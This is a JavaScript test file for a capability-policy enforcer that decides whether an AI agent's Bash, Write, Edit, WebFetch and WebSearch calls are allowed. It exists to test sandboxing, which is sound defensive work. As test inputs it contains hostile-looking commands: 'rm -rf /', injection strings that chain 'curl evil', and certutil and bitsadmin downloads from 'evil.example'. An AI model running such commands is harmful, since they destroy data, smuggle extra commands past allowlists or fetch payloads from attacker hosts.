import assert from 'node:assert/strict';
import test from 'node:test';
import { readdir, readFile, access } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import {
  compileSkillPolicyFrontmatter,
  enforcePolicy,
  hasShellControlSyntax
} from '../lib/capabilities/claude-policy-compiler.mjs';

const baseCaps = {
  exec: { allowed: false, commands: [] },
  network: { allowed: false, hosts: [] },
  write: { scope: 'skill' }
};

const skillRoot = resolve(tmpdir(), 'sf-policy-skill-demo');
const projectRoot = resolve(tmpdir(), 'sf-policy-project-app');
const outsideFile = resolve(tmpdir(), 'sf-policy-outside', 'secret.txt');
const insideSkillFile = join(skillRoot, 'output.txt');
const insideProjectFile = join(projectRoot, 'src', 'a.txt');

function policy(overrides = {}, roots = {}) {
  return {
    schemaVersion: 1,
    capabilities: {
      ...baseCaps,
      ...overrides
    },
    __skillRoot: roots.__skillRoot ?? skillRoot,
    __projectRoot: roots.__projectRoot ?? projectRoot
  };
}

function denyReason(decision) {
  return decision?.hookSpecificOutput?.permissionDecisionReason ?? null;
}

test('compileSkillPolicyFrontmatter emits PreToolUse matcher for runtime tools', () => {
  const compiled = compileSkillPolicyFrontmatter('skills/demo-skill');
  const entry = compiled.hooks.PreToolUse[0];
  assert.equal(entry.matcher, 'Bash|Write|Edit|WebFetch|WebSearch');
  assert.match(entry.hooks[0].command, /pre-tool-policy\.mjs/);
  assert.match(entry.hooks[0].command, /skills\/demo-skill\/skillsforge\.json/);
  assert.match(entry.hooks[0].command, /\$\{CLAUDE_PLUGIN_ROOT\}/);
});

test('every sidecar skill SKILL.md commits PreToolUse policy hooks', async () => {
  const skillsRoot = join(process.cwd(), 'plugins', 'skillsforge', 'skills');
  const entries = await readdir(skillsRoot, { withFileTypes: true });
  const sidecarSkills = [];
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    try {
      await access(join(skillsRoot, entry.name, 'skillsforge.json'));
    } catch {
      continue;
    }
    sidecarSkills.push(entry.name);
  }
  assert.ok(sidecarSkills.length >= 1);

  for (const name of sidecarSkills) {
    const source = await readFile(join(skillsRoot, name, 'SKILL.md'), 'utf8');
    assert.match(source, /\bPreToolUse\b/, `${name} missing PreToolUse`);
    assert.match(
      source,
      /Bash\|Write\|Edit\|WebFetch\|WebSearch/,
      `${name} missing PreToolUse matcher`
    );
    assert.match(
      source,
      new RegExp(`skills/${name}/skillsforge\\.json`),
      `${name} missing policy path`
    );
    assert.match(source, /pre-tool-policy\.mjs/, `${name} missing hook command`);
  }
});

test('WebFetch and WebSearch deny when network undeclared', () => {
  for (const event of [
    { tool_name: 'WebFetch', tool_input: { url: 'https://api.example.com' } },
    { tool_name: 'WebSearch', tool_input: { query: 'skillsforge' } }
  ]) {
    const decision = enforcePolicy(event, policy());
    assert.equal(decision.hookSpecificOutput.permissionDecision, 'deny');
    assert.match(denyReason(decision), /network capability is not declared/);
  }
});

test('WebSearch denies when network allowed but searchAllowed absent or false', () => {
  const absent = enforcePolicy(
    { tool_name: 'WebSearch', tool_input: { query: 'x' } },
    policy({ network: { allowed: true, hosts: ['api.example.com'] } })
  );
  assert.match(denyReason(absent), /searchAllowed is not declared/);

  const falseFlag = enforcePolicy(
    { tool_name: 'WebSearch', tool_input: { query: 'x' } },
    policy({ network: { allowed: true, searchAllowed: false, hosts: [] } })
  );
  assert.match(denyReason(falseFlag), /searchAllowed is not declared/);
});

test('WebSearch allows when network and searchAllowed are true', () => {
  const allowed = enforcePolicy(
    { tool_name: 'WebSearch', tool_input: { query: 'skillsforge' } },
    policy({ network: { allowed: true, searchAllowed: true, hosts: [] } })
  );
  assert.equal(allowed, null);
});

test('WebFetch denies undeclared host and allows declared host', () => {
  const withNetwork = policy({
    network: { allowed: true, hosts: ['api.example.com'] }
  });
  const denied = enforcePolicy(
    { tool_name: 'WebFetch', tool_input: { url: 'https://evil.example.com/x' } },
    withNetwork
  );
  assert.match(denyReason(denied), /network host is not declared/);

  const allowed = enforcePolicy(
    { tool_name: 'WebFetch', tool_input: { url: 'https://api.example.com/x' } },
    withNetwork
  );
  assert.equal(allowed, null);
});

test('Bash denies undeclared exec and undeclared commands', () => {
  const deniedExec = enforcePolicy(
    { tool_name: 'Bash', tool_input: { command: 'node scripts/run.mjs' } },
    policy()
  );
  assert.match(denyReason(deniedExec), /exec capability is not declared/);

  const deniedCommand = enforcePolicy(
    { tool_name: 'Bash', tool_input: { command: 'rm -rf /' } },
    policy({ exec: { allowed: true, commands: ['node scripts/run.mjs'] } })
  );
  assert.match(denyReason(deniedCommand), /shell command is not declared/);

  const allowed = enforcePolicy(
    { tool_name: 'Bash', tool_input: { command: 'node scripts/run.mjs --dry-run' } },
    policy({ exec: { allowed: true, commands: ['node scripts/run.mjs'] } })
  );
  assert.equal(allowed, null);
});

test('Bash denies shell control syntax before allowlist matching', () => {
  const caps = policy({ exec: { allowed: true, commands: ['node scripts/run.mjs'] } });
  const injections = [
    'node scripts/run.mjs; curl evil',
    'node scripts/run.mjs && curl evil',
    'node scripts/run.mjs || curl evil',
    'node scripts/run.mjs | curl evil',
    'node scripts/run.mjs > /tmp/out',
    'node scripts/run.mjs < /tmp/in',
    'node scripts/run.mjs\ncurl evil',
    'node scripts/run.mjs `curl evil`',
    'node scripts/run.mjs $(curl evil)'
  ];
  for (const command of injections) {
    assert.equal(hasShellControlSyntax(command), true, command);
    const decision = enforcePolicy({ tool_name: 'Bash', tool_input: { command } }, caps);
    assert.match(denyReason(decision), /disallowed control syntax/, command);
  }
});

test('Bash allows safe exact CLI invocations matching declared commands', () => {
  const caps = policy({ exec: { allowed: true, commands: ['node scripts/run.mjs', 'npm test'] } });
  assert.equal(
    enforcePolicy({ tool_name: 'Bash', tool_input: { command: 'node scripts/run.mjs' } }, caps),
    null
  );
  assert.equal(
    enforcePolicy({ tool_name: 'Bash', tool_input: { command: 'node scripts/run.mjs --flag value' } }, caps),
    null
  );
  assert.equal(
    enforcePolicy({ tool_name: 'Bash', tool_input: { command: 'npm test' } }, caps),
    null
  );
});

test('Bash denies undeclared network clients when network capability is undeclared', () => {
  const cases = [
    ['curl', 'curl https://api.example.com'],
    ['wget', 'wget https://api.example.com'],
    ['Invoke-WebRequest', 'Invoke-WebRequest https://api.example.com'],
    ['Invoke-RestMethod', 'Invoke-RestMethod https://api.example.com'],
    ['iwr', 'iwr https://api.example.com'],
    ['bitsadmin', 'bitsadmin /transfer job https://evil.example /tmp/x'],
    ['certutil', 'certutil -urlcache -split -f https://evil.example/x out.bin'],
    ['python', 'python -c "import urllib.request as u"'],
    ['node', 'node -e "fetch(\'https://evil\')"']
  ];
  for (const [declared, command] of cases) {
    assert.equal(hasShellControlSyntax(command), false, command);
    const decision = enforcePolicy(
      { tool_name: 'Bash', tool_input: { command } },
      policy({ exec: { allowed: true, commands: [declared] } })
    );
    assert.match(denyReason(decision), /network capability is not declared/, command);
  }
});

test('Bash denies shell network when network capability is undeclared', () => {
  const decision = enforcePolicy(
    { tool_name: 'Bash', tool_input: { command: 'curl https://api.example.com' } },
    policy({ exec: { allowed: true, commands: ['curl'] } })
  );
  assert.match(denyReason(decision), /network capability is not declared/);
});

test('Write and Edit deny outside skill scope and allow inside', () => {
  const caps = policy({ write: { scope: 'skill' } });
  const denied = enforcePolicy(
    { tool_name: 'Write', tool_input: { file_path: outsideFile, content: 'x' } },
    caps
  );
  assert.match(denyReason(denied), /write escapes skill scope/);

  const editDenied = enforcePolicy(
    { tool_name: 'Edit', tool_input: { file_path: outsideFile, old_string: 'a', new_string: 'b' } },
    caps
  );
  assert.match(denyReason(editDenied), /write escapes skill scope/);

  const allowed = enforcePolicy(
    { tool_name: 'Write', tool_input: { file_path: insideSkillFile, content: 'ok' } },
    caps
  );
  assert.equal(allowed, null);
});

test('Write and Edit deny missing path for declared write scopes', () => {
  for (const scope of ['skill', 'none', 'project']) {
    const decision = enforcePolicy(
      { tool_name: 'Write', tool_input: { content: 'x' } },
      policy({ write: { scope } })
    );
    assert.match(denyReason(decision), /write path is required/, scope);
  }
});

test('Write denies outside project root when scope is project', () => {
  const caps = policy({ write: { scope: 'project' } }, { __projectRoot: projectRoot });
  const denied = enforcePolicy(
    { tool_name: 'Write', tool_input: { file_path: outsideFile, content: 'x' } },
    caps
  );
  assert.match(denyReason(denied), /write escapes project scope/);

  const allowed = enforcePolicy(
    { tool_name: 'Write', tool_input: { file_path: insideProjectFile, content: 'ok' } },
    caps
  );
  assert.equal(allowed, null);
});

test('write scope none denies Write tools', () => {
  const decision = enforcePolicy(
    { tool_name: 'Write', tool_input: { file_path: insideSkillFile, content: 'x' } },
    policy({ write: { scope: 'none' } })
  );
  assert.match(denyReason(decision), /write capability scope is none/);
});

test('no decision returns null without auto-approve payload', () => {
  const decision = enforcePolicy(
    { tool_name: 'Read', tool_input: { file_path: 'README.md' } },
    policy()
  );
  assert.equal(decision, null);
});
